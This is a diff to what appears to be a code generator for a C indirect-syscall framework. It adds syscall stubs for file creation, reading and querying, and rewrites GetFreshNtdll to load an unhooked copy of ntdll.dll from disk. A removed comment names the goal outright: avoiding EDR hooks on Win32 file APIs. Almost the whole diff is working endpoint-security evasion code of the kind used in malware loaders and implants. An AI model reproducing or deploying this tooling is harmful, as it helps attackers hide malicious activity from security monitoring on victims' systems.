@@ -803,6 +803,9 @@ extern DWORD g_SyscallCount;
 #define IDX_NtCreateProcessEx           19
 #define IDX_NtSuspendProcess            20
 #define IDX_NtQuerySystemInformation    21
+#define IDX_NtCreateFile                22
+#define IDX_NtReadFile                  23
+#define IDX_NtQueryInformationFile      24
 
 // ============================================================================
 // Initialization
@@ -842,6 +845,9 @@ NTSTATUS NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_IN
 NTSTATUS NtUnmapViewOfSection(HANDLE, PVOID);
 NTSTATUS NtSuspendProcess(HANDLE);
 NTSTATUS NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
+NTSTATUS NtCreateFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+NTSTATUS NtReadFile(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+NTSTATUS NtQueryInformationFile(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);
 
 #ifdef __cplusplus
 }
@@ -979,6 +985,25 @@ typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULON
 NTSTATUS NtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength) {
     PrepareNextSyscall(IDX_NtQuerySystemInformation);
     return ((fn_NtQuerySystemInformation)DoSyscall)(InfoClass, Buffer, Length, ReturnLength);
+}
+
+typedef NTSTATUS (NTAPI *fn_NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+typedef NTSTATUS (NTAPI *fn_NtReadFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+typedef NTSTATUS (NTAPI *fn_NtQueryInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);
+
+NTSTATUS NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
+    PrepareNextSyscall(IDX_NtCreateFile);
+    return ((fn_NtCreateFile)DoSyscall)(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
+}
+
+NTSTATUS NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
+    PrepareNextSyscall(IDX_NtReadFile);
+    return ((fn_NtReadFile)DoSyscall)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
+}
+
+NTSTATUS NtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, ULONG FileInformationClass) {
+    PrepareNextSyscall(IDX_NtQueryInformationFile);
+    return ((fn_NtQueryInformationFile)DoSyscall)(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
 }
 '''
     
@@ -1338,6 +1363,9 @@ DWORD64 HashString(LPCSTR str);
             ("TerminateProcess",         "IDX_NtTerminateProcess"),
             ("SuspendProcess",           "IDX_NtSuspendProcess"),
             ("QuerySystemInformation",   "IDX_NtQuerySystemInformation"),
+            ("CreateFile",               "IDX_NtCreateFile"),
+            ("ReadFile",                 "IDX_NtReadFile"),
+            ("QueryInformationFile",     "IDX_NtQueryInformationFile"),
         ]
     
         # Build encrypted name arrays
@@ -1431,12 +1459,70 @@ PVOID GetNtdllFromPEB(VOID) {{
 }}
 
 PVOID GetFreshNtdll(VOID) {{
-    // NOTE: This implementation returns the PEB-mapped NTDLL.
-    // A future improvement should load a truly clean copy via the
-    // \\KnownDlls\\ntdll.dll section object to avoid hooked Win32 file APIs
-    // (CreateFileA/ReadFile), though EDR hooks on those calls are still
-    // visible in telemetry even when the resulting content is clean.
-    return GetNtdllFromPEB();
+    // Build path to ntdll.dll on disk
+    WCHAR wszNtdllPath[MAX_PATH] = {{ 0 }};
+    GetSystemDirectoryW(wszNtdllPath, MAX_PATH);
+    lstrcatW(wszNtdllPath, L"\\\\ntdll.dll");
+
+    // Build NT path: \\?\\C:\\Windows\\System32\\ntdll.dll
+    WCHAR wszNtPath[MAX_PATH + 8] = L"\\\\??\\\\";
+    lstrcatW(wszNtPath, wszNtdllPath);
+
+    UNICODE_STRING ustrPath;
+    ustrPath.Buffer = wszNtPath;
+    ustrPath.Length = (USHORT)(lstrlenW(wszNtPath) * sizeof(WCHAR));
+    ustrPath.MaximumLength = ustrPath.Length + sizeof(WCHAR);
+
+    OBJECT_ATTRIBUTES oa = {{ 0 }};
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+    oa.ObjectName = &ustrPath;
+    oa.Attributes = OBJ_CASE_INSENSITIVE;
+
+    IO_STATUS_BLOCK iosb = {{ 0 }};
+    HANDLE hFile = NULL;
+
+    PrepareNextSyscall(IDX_NtCreateFile);
+    NTSTATUS status = NtCreateFile(
+        &hFile,
+        FILE_READ_DATA | SYNCHRONIZE,
+        &oa,
+        &iosb,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ,
+        FILE_OPEN,
+        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+        NULL,
+        0
+    );
+    if (!NT_SUCCESS(status) || !hFile) return NULL;
+
+    // Get file size
+    FILE_STANDARD_INFORMATION fsi = {{ 0 }};
+    PrepareNextSyscall(IDX_NtQueryInformationFile);
+    status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
+    if (!NT_SUCCESS(status)) {{ NtClose(hFile); return NULL; }}
+    DWORD dwFileSize = (DWORD)fsi.EndOfFile.QuadPart;
+    if (dwFileSize == 0 || dwFileSize > 10 * 1024 * 1024) {{ NtClose(hFile); return NULL; }}
+
+    // Allocate buffer and read the file
+    PVOID pBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pBuffer) {{ NtClose(hFile); return NULL; }}
+
+    LARGE_INTEGER byteOffset = {{ 0 }};
+    PrepareNextSyscall(IDX_NtReadFile);
+    status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, pBuffer, dwFileSize, &byteOffset, NULL);
+    NtClose(hFile);
+    if (!NT_SUCCESS(status)) {{ VirtualFree(pBuffer, 0, MEM_RELEASE); return NULL; }}
+
+    // Validate PE headers
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBuffer;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {{ VirtualFree(pBuffer, 0, MEM_RELEASE); return NULL; }}
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBuffer + pDos->e_lfanew);
+    if (pNt->Signature != IMAGE_NT_SIGNATURE) {{ VirtualFree(pBuffer, 0, MEM_RELEASE); return NULL; }}
+
+    // Caller is responsible for VirtualFree(pBuffer, 0, MEM_RELEASE) when done
+    return pBuffer;
 }}
 
 PVOID GetNtdllBase(VOID) {{
@@ -4266,6 +4352,41 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
     PVOID           EntryPointActivationContext;
     PVOID           PatchInformation;
 } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+// ============================================================================
+// IO Structures
+// ============================================================================
+
+typedef struct _IO_STATUS_BLOCK {
+    union {
+        NTSTATUS Status;
+        PVOID    Pointer;
+    };
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+typedef struct _FILE_STANDARD_INFORMATION {
+    LARGE_INTEGER AllocationSize;
+    LARGE_INTEGER EndOfFile;
+    ULONG         NumberOfLinks;
+    BOOLEAN       DeletePending;
+    BOOLEAN       Directory;
+} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;
+
+#define FileStandardInformation 5
+
+#ifndef FILE_OPEN
+#define FILE_OPEN                       0x00000001
+#endif
+#ifndef FILE_SYNCHRONOUS_IO_NONALERT
+#define FILE_SYNCHRONOUS_IO_NONALERT    0x00000020
+#endif
+#ifndef FILE_NON_DIRECTORY_FILE
+#define FILE_NON_DIRECTORY_FILE         0x00000040
+#endif
+#ifndef OBJ_CASE_INSENSITIVE
+#define OBJ_CASE_INSENSITIVE            0x00000040L
+#endif
 
 // ============================================================================
 // Debug Macros
